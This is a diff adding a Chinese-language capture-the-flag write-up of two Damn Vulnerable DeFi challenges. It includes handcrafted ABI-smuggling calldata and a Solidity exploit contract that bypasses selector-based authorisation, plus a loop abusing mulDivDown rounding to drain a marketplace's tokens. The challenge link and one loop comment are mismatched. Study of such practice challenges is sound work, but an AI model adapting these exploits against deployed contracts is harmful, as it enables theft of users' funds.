@@ -950,3 +950,216 @@ console.log("beofre quote: ", quote1); //quote:3000000000000000000000000
         token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 ```
+
+### ABI Smuggling
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/climber/): 這裡有一個權限金庫，裡面存有 100 萬個 DVT 代幣。該金庫允許定期提取資金，也允許在緊急情況下提取所有資金。合約內嵌了一個通用授權方案，只允許已知帳戶執行特定操作。開發團隊已收到負責任的披露，稱所有資金可能被盜取。請從金庫中救出所有資金，並將其轉移到指定的回收帳戶。
+
+過關條件:
+- Vault 餘額為0
+- 所有VAULT_TOKEN_BALANCE代幣都被轉移到 recovery 錢包
+
+知識點:
+- EVM Calldata 組成
+
+解題:
+- 在 AuthorizedExecutor.execute() 使用 calldataload 從傳入的 actionData 從calldataOffset位置（100 bytes）開始提取 4 個字節的函數選擇器然後使用 getActionId 查這個 ID 是否被授權.
+- deployer 可以執行- sweepFunds 0x85fb709d
+player 可以執行- withdraw 0xd9caed12
+- 關鍵在下方只要繞過 getActionId檢查, 就可以任意執行 functionCall 了
+```
+        if (!permissions[getActionId(selector, msg.sender, target)]) {
+            revert NotAllowed();
+        }
+
+ 
+        return target.functionCall(actionData);
+```
+- 準備 payload. 在 execute() 函數的 ABI 編碼中，actionData 是一個動態大小的 bytes 參數。
+0x80 是一個偏移量，它指向 actionData 實際數據開始的位置。這個偏移量是相對於整個 calldata 的起始位置來計算的。所以在這邊是0x80
+
+```
+// execute selector
+0x1cff79cd
+// vault.address （第一個 32 字節）
+0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
+// offset -> 這個偏移量指向 actionData 在 calldata 中的起始位置。0x80 是 128 字節 （第二個 32 字節）
+0000000000000000000000000000000000000000000000000000000000000080
+// 這個部分沒有實際用途，通常用來填充固定長度的位置 （第三個 32 字節）
+0000000000000000000000000000000000000000000000000000000000000000
+// withdraw() 繞過檢查 （第四個 32 字節）
+**d9caed12**00000000000000000000000000000000000000000000000000000000
+// 這表示 actionData 的總長度是 68 字節（0x44 為十六進制的 68） actionData ( 4 + 32 + 32)
+0000000000000000000000000000000000000000000000000000000000000044
+// sweepFunds calldata
+85fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b
+```
+
+[POC](./damn-vulnerable-defi/test/abi-smuggling/ABISmuggling.t.sol) :
+```
+    function test_abiSmuggling() public checkSolvedByPlayer {
+        Exploit exploit = new Exploit(address(vault),address(token),recovery);
+        bytes memory payload = exploit.executeExploit();
+        address(vault).call(payload);
+    }
+
+contract Exploit {
+    SelfAuthorizedVault public vault;
+    IERC20 public token;
+    address public player;
+    address public recovery;
+
+    // Event declarations for logging
+    event LogExecuteSelector(bytes executeSelector);
+    event LogTargetAddress(bytes target);
+    event LogDataOffset(bytes dataOffset);
+    event LogEmptyData(bytes emptyData);
+    event LogWithdrawSelectorPadded(bytes withdrawSelectorPadded);
+    event LogActionDataLength(uint actionDataLength);
+    event LogSweepFundsCalldata(bytes sweepFundsCalldata);
+    event LogCalldataPayload(bytes calldataPayload);
+
+    constructor(address _vault, address _token, address _recovery) {
+        vault = SelfAuthorizedVault(_vault);
+        token = IERC20(_token);
+        recovery = _recovery;
+        player = msg.sender;
+    }
+
+    function executeExploit() external returns (bytes memory) {
+        require(msg.sender == player, "Only player can execute exploit");
+
+        // `execute()` function selector
+        bytes4 executeSelector = vault.execute.selector;
+
+        // Construct the target contract address, which is the vault address, padded to 32 bytes
+        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+
+        // Construct the calldata start location offset
+        bytes memory dataOffset = abi.encodePacked(uint256(0x80)); // Offset for the start of the action data
+
+        // Construct the empty data filler (32 bytes of zeros)
+        bytes memory emptyData = abi.encodePacked(uint256(0));
+
+        // Manually define the `withdraw()` function selector as `d9caed12` followed by zeros
+        bytes memory withdrawSelectorPadded = abi.encodePacked(
+            bytes4(0xd9caed12),     // Withdraw function selector
+            bytes28(0)              // 28 zero bytes to fill the 32-byte slot
+        );
+
+        // Construct the calldata for the `sweepFunds()` function
+        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
+            vault.sweepFunds.selector,
+            recovery,
+            token
+        );
+
+        // Manually set actionDataLength to 0x44 (68 bytes)
+        uint256 actionDataLengthValue = sweepFundsCalldata.length;
+        emit LogActionDataLength(actionDataLengthValue);
+        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));
+
+
+        // Combine all parts to create the complete calldata payload
+        bytes memory calldataPayload = abi.encodePacked(
+            executeSelector,              // 4 bytes
+            target,                       // 32 bytes
+            dataOffset,                   // 32 bytes
+            emptyData,                    // 32 bytes
+            withdrawSelectorPadded,       // 32 bytes (starts at the 100th byte)
+            actionDataLength,             // Length of actionData
+            sweepFundsCalldata            // The actual calldata to `sweepFunds()`
+        );
+
+        // Emit the calldata payload for debugging
+        emit LogCalldataPayload(calldataPayload);
+
+        // Return the constructed calldata payload
+        return calldataPayload;
+    }
+}
+```
+
+```
+REF
+ABI encoding of dynamic types (bytes, strings)
+In the ABI Standard, dynamic types are encoded the following way:
+
+The offset of the dynamic data
+The length of the dynamic data
+The actual value of the dynamic data.
+Memory loc      Data
+0x00            0000000000000000000000000000000000000000000000000000000000000020 // The offset of the data (32 in decimal)
+0x20            000000000000000000000000000000000000000000000000000000000000000d // The length of the data in bytes (13 in decimal)
+0x40            48656c6c6f2c20776f726c642100000000000000000000000000000000000000 // actual value
+If you hex decode 48656c6c6f2c20776f726c6421 you will get "Hello, world!".
+```
+### Shards
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/shards/): Shards NFT 市場是一個無需許可的智能合約，允許 Damn Valuable NFT 的持有者以任何價格（以 USDC 表示）出售這些 NFT。這些 NFT 可能非常有價值，以至於賣家可以將它們拆分成較小的份額（稱為 “shards”）。買家可以購買這些 shards，這些份額以 ERC1155 代幣形式表示。只有當整個 NFT 售出後，市場才會向賣家付款。市場向賣家收取 1% 的手續費，並以 Damn Valuable Tokens (DVT) 支付。這些 DVT 可以存放在安全的鏈上金庫中，而該金庫與 DVT 的質押系統整合。有人正在出售一個 NFT，價格高達……哇，一百萬 USDC？在那些瘋狂的玩家發現之前，你最好先深入研究這個市場。你一開始沒有任何 DVT，請儘量在一次交易中救回資金，並將資產存入指定的回收帳戶。
+
+過關條件:
+- Staking 合約中的代幣餘額沒有改變
+- marketplace 中消失的代幣（missingTokens）大於 initialTokensInMarketplace 的 0.01%
+- 所有追回的資金必須被轉移到 recovery 錢包
+- 必須只執行了一次交易
+
+知識點:
+- mulDivDown 向下捨去後為 0
+
+解題:
+- 題目預設有1個正在賣的NFT. 但 player 並沒有 dvt token 那要怎麼玩下去?
+- 檢查fill()的時候, 發現 want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards) 購買者購買的碎片數量是 want，但是該函數中的計算公式可能存在浮點數下溢或計算錯誤的情況，特別是 mulDivDown 和 _toDVT 的結合使用. 但這裡的算法會導致當 want 的數值較小時，最終計算結果可能為 0。這應該就是這題的考點. 所以我們可以支付 0 DVT 代幣即可獲得大量的 NFT 碎片. 計算後want最大值可以是133都會是0元購買.
+- 透過0元買到的 NFT 碎片, 可以透過cancel() 把碎片還給Marketplace, 這時候就可以拿到DVT代幣了.
+- POC 我執行了10001次, 在local run沒有fail. 如果再private fork環境fail的話再修改算法就好了.
+
+```
+    function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex) {
+
+        paymentToken.transferFrom(
+            msg.sender, address(this), want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
+        );
+        if (offer.stock == 0) _closeOffer(offerId);
+    }
+    function _toDVT(uint256 _value, uint256 _rate) private pure returns (uint256) {
+        return _value.mulDivDown(_rate, 1e6);
+    }
+
+```
+
+
+[POC](./damn-vulnerable-defi/test/shards/Shards.t.sol) :
+
+```
+ 
+    function test_shards() public checkSolvedByPlayer {
+
+        Exploit exploit = new Exploit(marketplace,token,recovery);
+        exploit.attack(1);
+        console.log("recovery balance",token.balanceOf(address(recovery)));
+        
+    }
+contract Exploit {
+    ShardsNFTMarketplace public marketplace;
+    DamnValuableToken public token;
+    address recovery;
+
+    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
+        marketplace = _marketplace;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack(uint64 offerId) external {
+        uint256 wantShards = 100; // Fill 100 shards per call
+
+        // Loop 10 times to execute fill(1, 100)
+        for (uint256 i = 0; i < 10001; i++) {
+            marketplace.fill(offerId, wantShards);
+            marketplace.cancel(1,i);
+        }
+
+        token.transfer(recovery,token.balanceOf(address(this)));
+    }
+}
+```
